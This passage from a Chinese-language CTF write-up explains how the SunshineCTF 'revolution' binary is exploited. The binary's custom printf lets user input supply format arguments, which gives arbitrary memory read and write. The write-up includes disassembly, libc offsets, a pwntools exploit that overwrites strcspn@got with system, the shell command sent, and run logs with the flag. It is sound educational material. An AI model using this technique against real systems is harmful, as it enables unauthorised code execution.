  4012d8: eb 1c              jmp    0x4012f6

--- 每輪迴圈 ---
  4012f6: 8b 44 24 e0        mov    eax,DWORD PTR [rsp-0x20]  ; eax = gp_offset
  4012fa: 83 f8 2f           cmp    eax,0x2f                  ; gp_offset <= 47 ?
  4012fd: 76 e1              jbe    0x4012e0                 ; 是 → 從「暫存器存檔區」拿
  4012ff: 48 8b 54 24 e8     mov    rdx,QWORD PTR [rsp-0x18]  ; rdx = overflow_arg_area
  401304: 83 c1 01           add    ecx,0x1
  401307: 48 8d 42 08        lea    rax,[rdx+0x8]             ; 指標 +8
  40130b: 48 89 44 24 e8     mov    QWORD PTR [rsp-0x18],rax  ; 存回 overflow_arg_area
  401310: 48 8b 02           mov    rax,QWORD PTR [rdx]       ; ★ 讀出參數
  401313: 39 ce              cmp    esi,ecx
  401315: 75 df              jne    0x4012f6                  ; 還沒到第 n 個 → 繼續
  401317: c3                 ret

--- gp_offset 還小於 48 時（暫存器區）---
  4012e0: 89 c2              mov    edx,eax                   ; edx = gp_offset
  4012e2: 83 c1 01           add    ecx,0x1
  4012e5: 83 c0 08           add    eax,0x8                   ; gp_offset += 8
  4012e8: 48 01 fa           add    rdx,rdi                   ; rdx = reg_save_area + gp_offset
  4012eb: 89 44 24 e0        mov    DWORD PTR [rsp-0x20],eax  ; 存回 gp_offset
  4012ef: 48 8b 02           mov    rax,QWORD PTR [rdx]
  4012f2: 39 ce              cmp    esi,ecx
  4012f4: 74 21              je     0x401317
  (fallthrough 回 0x4012f6)
```

對照 §4.1 的初始化值，可以得到**完整的參數對應表**：

| N | 來源 | 實際內容 |
|---|---|---|
| 1 | `reg_save_area + 8` = `[rsp+0x38]` | 進入 printf 時的 `rsi`（`strcspn` 留下的殘值） |
| 2 | `+0x10` = `[rsp+0x40]` | 進入時的 `rdx` |
| 3 | `+0x18` | 進入時的 `rcx` |
| 4 | `+0x20` | 進入時的 `r8` |
| 5 | `+0x28` | 進入時的 `r9` |
| 6 | `overflow_arg_area + 0` = `buf+0` | ★ 我們的輸入 |
| 7 | `buf+8` | ★ |
| N | `buf + 8*(N-6)` | ★ |

用 gdb 驗證（`%1$p` 印出 `0x7ffff7db21a0`，正好等於 printf 入口的 `rsi`）：

```
saved rsi @rsp+0x38 = 0x7ffff7db21a0   (== arg1)
```

#### ★ 不靠 gdb 也能自己驗證「arg 6 = buf」與「arg 14 = buf+0x40」

跟 pwn2 §4 一樣，我們可以在輸入裡放一個好認的標記，然後用 `%N$p` 掃過去 —— **不需要 gdb，也不需要相信任何人的數字**：

```python
# pwn3_marker.py
from pwn import *
context.log_level = 'error'
io = process('./revolution')
io.recvuntil(b'score> ')

def send(p):
    io.send(p + b'\n')
    return io.recvuntil(b'score> ', drop=True)[:-1]

# 1) 先證明 arg6 = buf[0..8)：%6$p 會印出 "%6$p\0\0\0\0" 這 8 bytes
print('arg6 =', send(b'%6$p'))        # → b'0x0000000070243625'
#  0x0000000070243625 就是 b'%6$p\x00\x00\x00\x00' 的小端解讀 ⇒ arg6 = buf[0..8)

# 2) 再把標記放在 buf+0x40，用 %14$p 找它（0x40/8 = 8 ⇒ 6+8 = 14）
payload = b'%6$p|%7$p|%14$p|%15$p\x00'.ljust(0x40, b'\x00') + b'AAAABBBB' + b'CCCCDDDD'
print('scan  =', send(payload))
```

實測輸出：

```
arg6 = b'0x0000000070243625'
scan = b'0x2437257c70243625|0x7c70243431257c70|0x4242424241414141|0x4444444443434343'
                                         ^^^^^^^^^^^^^^^^^^ = "AAAABBBB"（buf+0x40）
                                                            0x4444444443434343 = "CCCCDDDD"（buf+0x48 = arg15）
```

於是 `arg6 = buf[0..8)`、`arg14 = buf+0x40`、`arg15 = buf+0x48`，一般式 **`N = 6 + offset/8`**（§11-11）就自己驗證完了。

> 💡 小技巧：`%N$p` 的輸出一定是固定的 18 個字元（`0x` + 16 位 hex），所以 `%6$p` 的輸出可以直接讀出 `buf` 的前 8 bytes。
> 💡 `%6$p` 印出的 `0x0000000070243625` 之所以「看起來像亂碼」，是因為它把**格式字串自己的前 8 個字元**（`%6$p\0\0\0\0`）當成一個 8-byte 整數印出來 —— 這正是 arg6 == buf 的直接證據。

### ★★ 關鍵技巧：值不必是格式字串的一部分

`get_arg` 讀的是**記憶體**，不是「字串」。所以我們可以：

```
buf:  "%14$w"  \0  ......(padding 0)......  [qword: 目的位址] [qword: 值]
       ↑ 格式字串到這裡就結束       ↑ 從 buf+0x40 開始放資料
       （解析器看不到後面的 \x00）
```

* 解析器（4.6 節）掃到 `\0` 就停 → 不會把後面的二進位資料當成文字處理。
* 但 `get_arg` 照樣能讀到 `buf+0x40`、`buf+0x48` → **值裡面可以有 `\x00`**（libc 位址 `0x00007f...`
  一定會含 `\x00`，這招是必要的）。
* 參數編號：`buf+0x40` 對應 `N = 6 + 0x40/8 = 14`。

---

## 6. 漏洞成因總結

```
1. printf 的 va_list.overflow_arg_area 被設成 rsp+0x120，
   而 rsp+0x120 恰好等於 main 的輸入緩衝區 buf（因為 printf 的框架大小剛好 0x120）。
2. 於是「第 6 個以後的參數」= 我們輸入的內容。
   → 使用者可以完全控制參數「指標」與「值」。
3. %N$s  把使用者給的指標當字串印出        → 任意讀（NUL 結尾）
   %N$w  把使用者給的位址寫入使用者給的值  → 任意 8 bytes 寫，毫無檢查
4. 程式本身 non-PIE、Partial RELRO（.got.plt 可寫）、沒有 canary
   → 只要洩漏 libc，就能把 GOT 換成 system。
```

**為什麼不是堆疊溢位？** `read(0, buf, 0x1ff)` 讀 511 bytes 進 512 bytes 的緩衝區，
而且 `buf` 就在 `rsp`，返回位址在 `buf+0x218` —— 打不到。這題不需要 ROP。

---

## 7. 記憶體佈局圖（ASCII）

### 7.1 靜態資料（non-PIE，位址固定）

```
        0x403dc0  ┌──────────────────────────────┐  .init_array（main 之前執行）
                  │  0x4012b0 (frame_dummy)      │
                  │  0x401190 (stdio init:       │  ★ 就是它呼叫 setvbuf(_IONBF)，
                  │            setvbuf stdout/   │    所以 0x404020 的 GOT 值一定是
                  │            stderr = _IONBF)  │    已解析的真 libc 位址（§8.3）
        0x403dd0  ├──────────────────────────────┤  .fini_array
                  │  0x401280 (dtors)            │
        0x403dd8  ├──────────────────────────────┤  .dynamic
                  │  ...                         │
        0x403fd8  │  __libc_start_main (GLOB_DAT)│
        0x403fe0  │  __gmon_start__ (GLOB_DAT)   │
        0x403fe8  ├──────────────────────────────┤  .got.plt[0] _DYNAMIC
        0x403ff0  │  link_map                    │  .got.plt[1]  ← PLT0 會 push 這個
        0x403ff8  │  _dl_runtime_resolve         │  .got.plt[2]  ← 動態連結器
   ── GNU_RELRO 到這裡結束（0x403dc0 + 0x240 = 0x404000），以下都可寫 ──
        0x404000  │  write@libc                  │  ← JUMP_SLOT
        0x404008  │  strlen（IFUNC 挑選的實作）  │
        0x404010  │  strcspn（IFUNC 挑選的實作） │  ★★ 我們把它改成 system
        0x404018  │  read@libc                   │
        0x404020  │  setvbuf@libc                │  ★ 洩漏來源（開機時已解析）
        0x404028  ├──────────────────────────────┤
        0x404040  │  &_IO_2_1_stdout_            │  .bss：R_X86_64_COPY stdout
        0x404048  │  0                           │
        0x404050  │  0                           │
        0x404058  │  0                           │
        0x404060  │  &_IO_2_1_stderr_            │  .bss：R_X86_64_COPY stderr
        0x404068  │  __do_global_dtors_aux 旗標  │
        0x404070  └──────────────────────────────┘  .bss 結束
                  （0x404000–0x405000 整頁都是 rw-p，可自由使用）
```

> **怎麼自己驗證上面這兩格？**（`readelf -SW` 只會給你位址，內容要用 `objdump -s`）
> ```bash
> $ objdump -s -j .init_array revolution    # 403dc0 b0124000 90114000 → 0x4012b0, 0x401190
> $ objdump -s -j .fini_array revolution    # 403dd0 80124000          → 0x401280
> $ readelf -SW revolution | grep -E "init_array|fini_array"
>   [20] .init_array  INIT_ARRAY  0000000000403dc0 ... 08  WA
>   [21] .fini_array  FINI_ARRAY  0000000000403dd0 ... 08  WA
> ```
> `.init_array` 的兩個函式在 `main` **之前**被執行：`0x4012b0` 是 `frame_dummy`，
> `0x401190` 就是 §1.2 說的 stdio 初始化（它呼叫 `setvbuf(stdout, NULL, 2, 0)` 和 `setvbuf(stderr, NULL, 2, 0)`）。

> **COPY relocation 是什麼**：因為執行檔直接讀 `stdout` 這個變數（`0x401198: mov rdi,[rip+0x2ea1] # 404040`），
> 連結器就在執行檔的 `.bss` 開一塊 8 bytes 的空間，開機時把 libc 裡的 `stdout`（型別 `FILE*`）**複製**過來。
> 結果：`[0x404040]` 就是一個現成的 libc 指標 → 也是很好的洩漏來源。

### 7.2 堆疊（每次執行位址不同）

```
  高位址
   buf+0x218  │  返回位址（__libc_start_call_main+x）     │  ← 參數 73
   buf+0x210  │  呼叫者的 r12                             │  ← 參數 72
   buf+0x208  │  呼叫者的 rbp（指向堆疊）                 │  ← 參數 71
   buf+0x200  │  呼叫者的 rbx = 0                         │  ← 參數 70
   buf+0x1F8  │  ...（緩衝區尾端）                        │
              │                                           │
   buf+0x40   │  ★ 我們放參數 qword 的地方                │  ← 參數 14 起
   buf+0x08   │                                           │  ← 參數 7
   buf+0x00   │  格式字串開頭                             │  ← 參數 6
   buf-0x08   │  printf 的返回位址（0x40113d）            │
   buf-0x10   │  printf 保存的 r15（= main 的 r15）       │
   buf-0x18   │  printf 保存的 r14（呼叫者的 r14）        │
   buf-0x20   │  printf 保存的 r13（呼叫者的 r13）        │
   buf-0x28   │  printf 保存的 r12（= 0x40201a "score> "）│
   buf-0x30   │  printf 保存的 rbp（= 0x402022 "\n"）     │
   buf-0x38   │  printf 保存的 rbx = buf  ★               │
   ...        │                                           │
   buf-0x120  │  printf 內部的 rsp                        │  ★ overflow_arg_area = rsp+0x120 = buf
  低位址
```

#### 為什麼 `rbx` 在 `buf-0x38` 而不是 `buf-0x10`？

`printf`（`0x401330`）進場依序做了**六個 push**：
`push r15; push r14; push r13; push r12; push rbp; push rbx`（6 × 8 = 0x30 bytes）。
所以六個「保存值」由高位址往低位址、從 `buf-0x10` 一路排到 `buf-0x38` ——
**`rbx` 是最後一個被 push 的**（位址最低，在 `buf-0x38`）；之後再 `sub rsp,0xe8`，`rsp` 才落到 `buf-0x120`。

> **自己驗一次整排**：`sub rsp,0xe8` 在 `0x40133d`，所以在**那一條執行之前**下斷點（`b *0x40133d`）
> 時 `rsp` 還在 `buf-0x38`，六個保存值就依序是
> `[rsp]`=`rbx`、`[rsp+8]`=`rbp`、`[rsp+0x10]`=`r12`、`[rsp+0x18]`=`r13`、`[rsp+0x20]`=`r14`、`[rsp+0x28]`=`r15`。
> （等 `sub` 執行完 `rsp` 變成 `buf-0x120`，同幾格就變成 `[rsp+0xe8]` … `[rsp+0x110]`。）

| 位置 | 內容 |
|---|---|
| `buf-0x08` | `printf` 的返回位址 = `0x40113d` |
| `buf-0x10` | 保存的 `r15`（= `main` 執行時的 r15，本機實測 `0x403dd0`） |
| `buf-0x18` | 保存的 `r14`（= `main` 執行時的 r14；`main` 沒動過它 ⇒ 值**不穩定**，本機實測 `0x7ffff7ffd000`。⚠️ `0x402009` = `"0123456789abcdef"` 是 `printf` **自己**在 `0x4013a4` 載入 `r14` 的值，**不是這一格的內容**） |
| `buf-0x20` | 保存的 `r13`（= `main` 執行時的 r13；同樣不穩定，本機實測 `0x1`） |
| `buf-0x28` | 保存的 `r12`（`0x40201a` = `"score> "`） |
| `buf-0x30` | 保存的 `rbp`（= `main` 的 rbp = `0x402022` = `"\n"`） |
| **`buf-0x38`** | **保存的 `rbx` = `buf`** ← 就是 §4.1 gdb 印的 `[rsp+0xe8]` |

`rbx` 的值是 `buf`，是因為 `main` 在 `0x40110d` 執行了 `mov rbx,rsp`（見 §3 逐行表）。
**自己驗證**：§4.1 的 gdb 最後一行 `x/1gx $rsp+0xe8` 就會印出 `buf`（因為 `rsp+0xe8 == buf-0x38`）。

---

## 8. 資訊洩漏 → libc base 的計算式

### 8.1 遠端 libc 的指紋

連 4 次遠端連線，取 GOT/COPY 指標，算出**與 ASLR 無關的差值**（每次都一樣）：

| 符號 | 相對 `setvbuf` 的位移 |
|---|---|
| `read` | `+0x93510` |
| `write` | `+0x94020` |
| `_IO_2_1_stdout_` | `+0x17c080` |
| `_IO_2_1_stderr_` | `+0x17bfa0` |

拿這些差值去比對 12 個真實 libc 檔（Ubuntu 2.31/2.35/2.39 各 patch 版、2.41/2.42/2.43、本機 Arch），
只有 **Ubuntu 24.04 的 `libc6 2.39-0ubuntu8 / 8.1 / 8.2 / 8.3`** 完全吻合：

| 符號 | offset（`libc6_2.39-0ubuntu8.3`） |
|---|---|
| `setvbuf` | `0x88540` |
| `system` | `0x58740` |
| `read` | `0x11ba50` |
| `write` | `0x11c560` |
| `_IO_2_1_stdout_` | `0x2045c0` |
| `_IO_2_1_stderr_` | `0x2044e0` |

### 8.2 計算式

```
setvbuf_libc = *(uint64_t *)0x404020          # 用 %14$s 讀出來（NUL 結尾，6 bytes）
libc_base    = setvbuf_libc - 0x88540         # 遠端（Ubuntu 24.04 glibc 2.39-0ubuntu8.x）
system       = libc_base    + 0x58740

# 本機（Arch，跑 exploit.py 不加參數時使用）
libc_base    = setvbuf_libc - 0x843f0
system       = libc_base    + 0x54580
```

交叉驗證（用第二個洩漏確認沒算錯，程式會自動印出來）：

```
*(uint64_t *)0x404040 - libc_base == 0x2045c0   # &_IO_2_1_stdout_
```

實測輸出：

```
[+] setvbuf@libc = 0x78d497ba3540   ->   libc base = 0x78d497b1b000
[*] &_IO_2_1_stdout_ = 0x78d497d1f5c0 (base+0x2045c0)     ← 完全吻合
[+] system = 0x78d497b73740
```

### 8.3 為什麼用 `setvbuf` 而不是 `len`/`strcspn`

* `setvbuf` 在 `main` 執行前就被 `0x401190` 呼叫過 → GOT 一定已解析成真正的 libc 位址。
* `strlen`、`strcspn` 是 **IFUNC**（多版本最佳化），GOT 裡是「被 CPU 特性挑中的實作」
  （例如 `__strcspn_avx2`），不是符號本身的 offset，拿來當 fingerprint 會誤判。

---

## 9. `exploit.py` 逐行註解

> **這一節是「精簡版」**：為了閱讀方便，省略了 `assert` 自檢、`try/except`、
> `REMOTE_LIBC` / `local_libc_offsets()` 的細節、以及 `COMMANDS` 的完整內容（`2>/dev/null`、
> 本機 flag 的絕對路徑、`ls -la /`…），有些呼叫也合併成一行。
> **要對照檔案請直接看 `exploit.py`**（行號對不起來是正常的）。
> 真實檔案裡有幾個很重要的自檢，建議自己寫的時候也留著：
> ```python
> assert b'\n' not in payload          # 換行會讓 read() 提前結束這一輪
> assert len(payload) < 0x1ff          # 超過 511 bytes 會被 read() 截斷
> assert data.endswith(b'\n')          # printf 之後 main 固定寫一個 '\n' → 沒收到就是解析錯了
> assert out == b'ok', out             # %N$w 成功才會印 "ok"
> ```

```python
# 0) ★ 在 import pwntools 之前先把 argv 抄一份（否則 REMOTE 會被 pwnlib.args 吃掉，見 §11-1）
import sys as _sys
_argv = list(_sys.argv[1:])

from pwn import *

# 1) 連線，吃掉標題與第一個 "score> "
class Revolution:
    def __init__(self, remote_mode=False):
        self.io = remote(HOST, PORT) if remote_mode else process(BINARY)
        self.io.recvuntil(b'score> ')          # 提示字串固定是 "score> "

# 2) 送一行格式字串，取回 printf 產生的輸出
    def fmt(self, payload):
        self.io.send(payload + b'\n')          # 一定要有 '\n' 讓 main 的 read 結束
        data = self.io.recvuntil(b'score> ', drop=True)
        return data[:-1]                       # main 固定會多寫一個 '\n'

# 3) 任意讀：%14$s，把要讀的位址放在 buf+0x40（= 參數 14）
    def _leak_str(self, addr):
        payload = b'%%%d$s\x00' % ARG0                       # "%14$s\0"
        payload = payload.ljust(VALS_OFF, b'\x00')           # 補到 0x40，順便提早結束字串
        return self.fmt(payload + p64(addr))                 # buf+0x40 = 目標位址

# 4) %s 內部用 strlen，遇到 \x00 就停 → 一個 byte 一個 byte 探測，組回 8 bytes
    def read_mem(self, addr, n):
        out, cur = b'', addr
        while len(out) < n:
            chunk = self._leak_str(cur)
            if chunk:      out += chunk[:n-len(out)]; cur += len(chunk)
            else:          out += b'\x00';            cur += 1   # 空輸出 = 該 byte 是 0x00

# 5) 任意寫：%14$w → *(u64*)arg[14] = arg[15]
    def write_qword(self, dest, value):
        payload = b'%%%d$w\x00' % ARG0                       # "%14$w\0"
        payload = payload.ljust(VALS_OFF, b'\x00')
        out = self.fmt(payload + p64(dest) + p64(value))
        assert out == b'ok', out                             # 成功會回 "ok"（失敗就把實際輸出印出來）

# 6) 主流程
probe = ch.read_mem(0x4010d0, 8)                    # 確認程式碼一樣（f30f1efa4154ba1f）
setvbuf = ch.read_qword(0x404020)                   # 洩漏 libc
libc_base = setvbuf - libc['setvbuf']               # 算 base（遠端 0x88540／本機 0x843f0）
assert ch.read_qword(0x404040) - libc_base == 0x2045c0    # 用第二個指標交叉驗證（本機是 0x217580）
ch.write_qword(0x404010, libc_base + libc['system'])      # strcspn@got = system
ch.cmd(COMMANDS)                                    # 完整 COMMANDS 見 exploit.py:161-162：
                                                    #   "cat flag.txt /flag /home/*/flag.txt /app/flag.txt
                                                    #    <本機 flag 絕對路徑> 2>/dev/null; ls -la; ls -la /; id; echo DONE"
                                                    # → main 呼叫 system(buf)
```

### 9.1 為什麼改 `strcspn@got` 就能執行指令？

```
main 的迴圈每輪都做：
    read(0, buf, 0x1ff);        // 讀我們這一行
    strcspn(buf, "\n");         // ← 這一行的 GOT 被我們改成 system
```

`strcspn(buf,"\n")` 的參數是 `rdi = buf`（我們這一行）、`rsi = "\n"`。
把 GOT 改成 `system` 後，實際呼叫變成：

```c
system(buf, "\n");      // rsi 被忽略 → 等於 system(buf)
```

於是**我們打的每一行都會被 `/bin/sh -c` 執行**。

### 9.2 為什麼「只能執行一行」？（重要觀念，但只在遠端成立）

`system()` 的回傳型別是 `int`（32 bit），而 `strcspn()` 是 `size_t`（64 bit）。
編譯器假設回傳值是乾淨的 64 bit，於是 `main` 裡有：

```asm
  401132: c6 04 04 00   mov BYTE PTR [rsp+rax*1],0x0   ; buf[rax] = 0  ← 用完整 64 bit rax
```

glibc 的 `system()` 只保證 `eax` 有效，**`rax` 的高 32 bit 是「未定義」** →
`[rsp+rax]` 可能變成亂七八糟的位址 → 寫入時 SIGSEGV。

實測驗證：

| 把 `strcspn@got` 改成 | 遠端（Ubuntu 24.04 glibc 2.39） | 本機（Arch glibc） |
|---|---|---|
| `read`（回傳 `ssize_t`，乾淨 64 bit） | 連送三行都存活，每行都被印出來 + `score> ` | 同左 ✅ |
| `strlen`（IFUNC 的 resolver，回傳函式位址） | 立刻爆掉（`buf[rax]` 寫到程式碼位址） | 同左 |
| `system`（回傳 `int`） | 第一行指令的輸出**完整**印出來，然後 **SIGSEGV**（不會再有 `score> `） | **不會爆**，`score> ` 照樣出現，可連送多行 ⚠️ |

> ⚠️ **「只能一行」是實作相依，不是通則。** 本機 Arch 的 libc 實測在改成 `system` 之後**連送三行都存活**
> （`ONE` / `TWO` / `THREE` 都執行、都印出 `score> `）；遠端 Ubuntu 24.04 則在第一行之後就死。
> 原因是「高 32 bit 是未定義」——**運氣好是 0、運氣不好就是垃圾**，不同 libc／編譯方式都可能不一樣。
> 所以**不要依賴「本機多送幾行看看」來判斷有沒有成功**，也不要因為本機多印了一行 `score> ` 就以為寫錯了。

因此 exploit 一律把 `cat flag...`、`ls -la`、`id` 全部塞進**同一行** `sh -c` 指令：
這在遠端是「唯一安全」的寫法，在本機也一樣能跑。

---

## 10. 實際執行結果

### 10.1 本機（`./flag.txt` = `sun{LOCAL_TEST_FLAG}`）

> （**節錄**：因為 `COMMANDS` **同時**執行了 `cat flag.txt` 與本機 flag 的絕對路徑，
> 所以本機的 flag 會印**兩次**；而且本機不會 SIGSEGV，結尾還會再出現一行 `score> `（見 §9.2）。
> 完整紀錄在 `pwn3/local_run.log`。）

```
$ python3 exploit.py
[*] mode      : LOCAL ./revolution
[*] code probe @0x4010d0 = f30f1efa4154ba1f
[+] setvbuf@libc = 0x7f9bc94843f0   ->   libc base = 0x7f9bc9400000
[*] &_IO_2_1_stdout_ = 0x7f9bc9617580 (base+0x217580)
[+] system = 0x7f9bc9454580
[+] strcspn@got overwritten -> main() runs system(buf) on the next line
sun{LOCAL_TEST_FLAG}
sun{LOCAL_TEST_FLAG}        ← 第二次：命令裡還帶了本機 flag 的絕對路徑
total 2196
drwxr-xr-x  3 kzzz kzzz    4096 ...
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

score>                      ← 本機不會 SIGSEGV（見 §9.2）
FLAG: sun{LOCAL_TEST_FLAG}
```

### 10.2 遠端（`chal.sunshinectf.games:26002`）

> （**節錄**：實測輸出裡還有**一整段 `ls -la /` 的根目錄列表**，因為 `COMMANDS` 同時執行了 `ls -la /`。
> 完整紀錄在 `pwn3/remote_run.log`。）

```
$ python3 exploit.py REMOTE
[*] mode      : REMOTE chal.sunshinectf.games:26002
[*] target libc: libc6_2.39-0ubuntu8.3 (Ubuntu 24.04)
[*] code probe @0x4010d0 = f30f1efa4154ba1f
[+] setvbuf@libc = 0x78d497ba3540   ->   libc base = 0x78d497b1b000
[*] &_IO_2_1_stdout_ = 0x78d497d1f5c0 (base+0x2045c0)
[+] system = 0x78d497b73740
[+] strcspn@got overwritten -> main() runs system(buf) on the next line
sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
total 12
drwxr-xr-x 2 root root       4096 Sep 26 00:21 .
drwxr-xr-x 1 root root       4096 Sep 26 00:54 ..
-rw-r----- 1 root revolution   36 Sep 26 00:13 flag.txt
（… 這裡省略了 ls -la / 的內容 …）
uid=1337(revolution) gid=1337(revolution) groups=1337(revolution)
DONE

FLAG: sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
```
（遠端在一行指令之後就不再有 `score> ` —— 行程 SIGSEGV，與 §9.2 的觀察一致。）

### 10.3 真實 flag

```
sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
```

（連續執行 4 次遠端，成功率 4/4。）

---

## 11. 常見坑（血淚筆記）

1. **`pwntools` 會吃掉 `sys.argv` 裡的純大寫單字。**
   `python3 exploit.py REMOTE` 在 `from pwn import *` 之後，`sys.argv` 只剩 `['exploit.py']`
   （被當成 `pwnlib.args` 的開關）。
   → 解法：在 import pwntools **之前**先 `_argv = list(sys.argv[1:])` 存一份。
   > 💡 如果你用的是 pwntools 官方的 `args.REMOTE`（`wp/00_基礎知識_從零開始.md` §12 的骨架），那不用理這條 ——
   > 實測 `sys.argv` 會從 `['-c','REMOTE']` 變成 `['-c']`，但同一時間 **`args.REMOTE == True`**。
   > 會出問題的只有「自己解析 `sys.argv[1]`」的寫法（本 exploit 就是這種）。

2. **值的 `\x00` 一定要放在「格式字串結束之後」。**
   解析器遇到 `\x00` 就停，但 `get_arg` 讀的是記憶體，不受影響。
   所以佈局必須是 `"%14$w\0" + padding + [dest][value]`；把含 `\x00` 的 qword 放在 `\0` 前面，
   整個 specifier 就不會被解析（而且 `read` 進來的資料仍然完整）。

3. **`%N$s` 是 `strlen` 版本，不是 `memcpy`。**
   指標最低位 byte 是 `0x00` 時輸出會是空的（不是 0）。
   → 必須用「逐 byte 探測」：讀到空輸出就代表那個 byte 是 `0x00`。
   > ⚠️ 逐 byte 探測**只適用於「確定整段都在同一個 mapped 區域」的位址**（本題都是 `0x400000`
   > 附近的程式／資料段）。只要 `%N$s` 收到的指標指到**沒有映射的頁**，`strlen` 就會 SIGSEGV，
   > 整個連線當場死掉。拿它去亂掃記憶體是自殺 —— 這也是為什麼 exploit 只讀固定的那幾個
   > GOT／COPY 位址（`0x404000`–`0x404068`）。

4. **`strlen` / `strcspn` 是 IFUNC。**
   GOT 裡存的是「被挑中的實作」（如 `__strcspn_avx2`），不是 `readelf -s` 看到的符號 offset。
   我一開始拿 `strcspn@got` 的值去比對 libc offset，得到「strcspn 比 write 還高」的荒謬結論，
   差點以為遠端跑的是另一份 binary。**別拿 IFUNC 符號做指紋**，改用 `read`/`write`/`setvbuf`/`stdout`。

5. **本機 libc ≠ 遠端 libc。**
   本機是 Arch（`setvbuf=0x843f0, system=0x54580`），遠端是 Ubuntu 24.04（`0x88540 / 0x58740`）。
   直接把本機 offset 拿去打遠端 100% 失敗。
   → 用「與 ASLR 無關的差值」對照真實 libc 檔（`readelf -s` / pwntools `ELF.symbols`）找出正確版本。

6. **`system` 會回傳 `int`，高 32 bit 是「未定義」→ 遠端會在一行之後 SIGSEGV，所以所有指令要塞進同一行 `sh -c`。**
   本機 Arch glibc 實測「不會」爆（可連送多行），但**不要依賴這個行為**：不同的 libc／編譯方式都可能讓高 32 bit 帶著垃圾，`buf[rax] = 0` 就會寫到野位址。exploit 一律塞同一行是唯一安全的寫法。見 §9.2。

7. **不要相信題目提示裡的「`.bss 0x4060` 的 16-bit 長度整數溢位 + `memcpy`」說法。**
   我照著驗證過：
   * `0x4060` 根本不在 `.bss`（`.bss` 是 `0x404040`–`0x404070`），`0x404060` 是 **stderr 的 COPY relocation 欄位**。
   * 這支程式**沒有匯入 `memcpy`**（`readelf -s` 只有 write/strlen/strcspn/read/setvbuf）。
   * `0x401540` 的 16 進位轉換只是把 18 bytes 寫進 printf 自己堆疊框的暫存區，安全。
   真正的原因在 §4.1 / §6：`overflow_arg_area` 初始化成 `buf`。
   **每個位址/機制都要自己用 `objdump`/`gdb` 驗證，不要沿用別人的猜測。**

8. **`%<數字>x`（沒有 `$`）不會做事。**
   數字後面不是 `$` 時，程式直接跳到 `0x401480` 把格式字元吞掉。
   想用 `%p` 洩漏一定要寫成 `%N$p`。

9. **輸出解析不要用 `recvline()`。**
   洩漏出來的是**二進位**，裡面可能含 `0x0a`。
   用 `recvuntil(b'score> ')` 再砍掉結尾的 `\n` 才穩。

10. **`%N$w` 成功時會印 `ok`**，拿它當寫入成功的確認訊號很方便。

11. **偏移計算**：`buf+0x40` 對應參數 `N = 6 + 0x40/8 = 14`。
    記法：`N = 6 + offset/8`。想改放資料的位置，記得同步改 specifier 裡的數字。

12. **`0x4013f9` 的 `%%`**：格式字串裡想印一個 `%` 要寫 `%%`；不過本題我們都用 `%14$...`，用不到。

---

## 12. 附錄

### 12.1 位址速查表

| 位址 | 內容 |
|---|---|
| `0x401020` | PLT0（`push link_map; jmp _dl_runtime_resolve`） |
| `0x401080/90/a0/b0/c0` | `write@plt` / `strlen@plt` / `strcspn@plt` / `read@plt` / `setvbuf@plt` |
| `0x4010d0` | `main` |
| `0x401190` | stdio 初始化（對 stdout/stderr 做 `setvbuf(_IONBF)`） |
| `0x4012c0` | `get_arg`（自製 `va_arg`） |
| `0x401330` | 自製 `printf` |
| `0x4014cd` | `%N$w`（任意寫）的處理器 |
| `0x401540` | `%N$p` 的處理器 |
| `0x40159d` | `%N$s`（任意讀）的處理器 |
| `0x402004` | `"%"` |
| `0x402006` | `"ok"` |
| `0x402009` | `"0123456789abcdef"` |
| `0x40201a` | `"score> "` |
| `0x402022` | `"\n"` |
| `0x402028` | `"=== PRINT PRINT REVOLUTION ===\n"` |
| `0x402048` | `"Enter your score card template:\n"` |
| `0x40206a` | `"0x"` |
| `0x404000` | `write@got` |
| `0x404010` | `strcspn@got` ← 改成 `system` |
| `0x404020` | `setvbuf@got` ← 洩漏來源 |
| `0x404040` | `&_IO_2_1_stdout_`（COPY reloc） |
| `0x404060` | `&_IO_2_1_stderr_`（COPY reloc） |

### 12.2 執行方式

```bash
cd /home/kzzz/Documents/code/ctf/sunshine/pwn3
python3 exploit.py            # 本機（需要 flag.txt）
python3 exploit.py REMOTE     # 遠端 chal.sunshinectf.games:26002
```

### 12.3 檔案清單

| 檔案 | 說明 |
|---|---|
| `exploit.py` | 最終 exploit（本機 / 遠端兩種模式） |
| `FLAG.txt` | 真實 flag |
| `notes.md` | 本教學筆記 |
| `NOTES_SUMMARY.txt` | 給上層 agent 的 30 行摘要 |
| `rev.asm` | `objdump -d -M intel revolution` 的完整輸出（可自行對照） |
| `local_run.log` / `remote_run.log` | 實際執行紀錄 |
| `libc-2.39-0ubuntu8.3.so.6` | 從 Ubuntu 套件取出的遠端 libc（用於核對 offset） |
| `flag.txt` | 本機測試用假 flag |

---

## 13. 一頁式心智模型

```
┌───────────────┐   read(0, buf, 0x1ff)   ┌──────────────────────────────┐
│  使用者的輸入  │ ──────────────────────> │ main 的 buf (== rsp, 0x200) │
└───────────────┘                         └──────────────┬───────────────┘
                                                                         │ call printf(buf)
                                                         ▼
                             ┌────────────────────────────────────────────┐
                             │ printf: overflow_arg_area = rsp+0x120 = buf│
                             │  → 第 6 個以後的「可變參數」= 使用者的輸入 │
                             └───────┬───────────────────┬────────────────┘
                                     │                                    │
                        %N$s  任意讀 │                                    │ %N$w  任意寫
                                     ▼                   ▼
                    leak *(u64*)0x404020           *(u64*)0x404010 = system
                     → libc base = v - 0x88540      (strcspn@got ← system)
                                     │                   │
                                     └─────────┬─────────┘
                                               ▼
                              main 下一輪: system(我們這一行) → shell
                                               ▼
                                 cat flag.txt → sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
```
